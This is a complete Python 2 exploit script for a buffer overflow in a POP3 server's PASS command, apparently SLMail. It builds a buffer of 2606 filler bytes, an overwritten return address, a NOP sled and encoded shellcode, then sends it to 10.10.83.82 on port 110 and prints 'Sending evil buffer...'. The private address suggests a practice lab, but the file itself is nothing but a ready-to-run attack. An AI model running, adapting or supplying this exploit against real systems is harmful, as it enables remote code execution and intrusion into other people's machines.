import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf = "A" * 2606 +  "\x8f\x35\x4a\x5f" + "\x90" * 30



buf +=  b""
buf += b"\xbe\x36\xd1\xb0\xc2\xdb\xc1\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x77\x12\x03\x77\x12\x83\xd9\x2d\x52"
buf += b"\x37\xd9\x26\x11\xb8\x21\xb7\x76\x30\xc4\x86\xb6\x26"
buf += b"\x8d\xb9\x06\x2c\xc3\x35\xec\x60\xf7\xce\x80\xac\xf8"
buf += b"\x67\x2e\x8b\x37\x77\x03\xef\x56\xfb\x5e\x3c\xb8\xc2"
buf += b"\x90\x31\xb9\x03\xcc\xb8\xeb\xdc\x9a\x6f\x1b\x68\xd6"
buf += b"\xb3\x90\x22\xf6\xb3\x45\xf2\xf9\x92\xd8\x88\xa3\x34"
buf += b"\xdb\x5d\xd8\x7c\xc3\x82\xe5\x37\x78\x70\x91\xc9\xa8"
buf += b"\x48\x5a\x65\x95\x64\xa9\x77\xd2\x43\x52\x02\x2a\xb0"
buf += b"\xef\x15\xe9\xca\x2b\x93\xe9\x6d\xbf\x03\xd5\x8c\x6c"
buf += b"\xd5\x9e\x83\xd9\x91\xf8\x87\xdc\x76\x73\xb3\x55\x79"
buf += b"\x53\x35\x2d\x5e\x77\x1d\xf5\xff\x2e\xfb\x58\xff\x30"
buf += b"\xa4\x05\xa5\x3b\x49\x51\xd4\x66\x06\x96\xd5\x98\xd6"
buf += b"\xb0\x6e\xeb\xe4\x1f\xc5\x63\x45\xd7\xc3\x74\xaa\xc2"
buf += b"\xb4\xea\x55\xed\xc4\x23\x92\xb9\x94\x5b\x33\xc2\x7e"
buf += b"\x9b\xbc\x17\xd0\xcb\x12\xc8\x91\xbb\xd2\xb8\x79\xd1"
buf += b"\xdc\xe7\x9a\xda\x36\x80\x31\x21\xd1\xa5\xcd\x7d\x09"
buf += b"\xd2\xcf\x7d\x4d\xf0\x59\x9b\x27\xe4\x0f\x34\xd0\x9d"
buf += b"\x15\xce\x41\x61\x80\xab\x42\xe9\x27\x4c\x0c\x1a\x4d"
buf += b"\x5e\xf9\xea\x18\x3c\xac\xf5\xb6\x28\x32\x67\x5d\xa8"
buf += b"\x3d\x94\xca\xff\x6a\x6a\x03\x95\x86\xd5\xbd\x8b\x5a"
buf += b"\x83\x86\x0f\x81\x70\x08\x8e\x44\xcc\x2e\x80\x90\xcd"
buf += b"\x6a\xf4\x4c\x98\x24\xa2\x2a\x72\x87\x1c\xe5\x29\x41"
buf += b"\xc8\x70\x02\x52\x8e\x7c\x4f\x24\x6e\xcc\x26\x71\x91"
buf += b"\xe1\xae\x75\xea\x1f\x4f\x79\x21\xa4\x7f\x30\x6b\x8d"
buf += b"\x17\x9d\xfe\x8f\x75\x1e\xd5\xcc\x83\x9d\xdf\xac\x77"
buf += b"\xbd\xaa\xa9\x3c\x79\x47\xc0\x2d\xec\x67\x77\x4d\x25"



try:

	print "\nSending evil buffer..."

	s.connect(('10.10.83.82',110))

	data = s.recv(1024)

	s.send('USER username' +'\r\n')

	data = s.recv(1024)

	s.send('PASS ' + buf + '\r\n')

	data = s.recv(1024)

	s.close()

except:

	print "Could not connect to POP3!"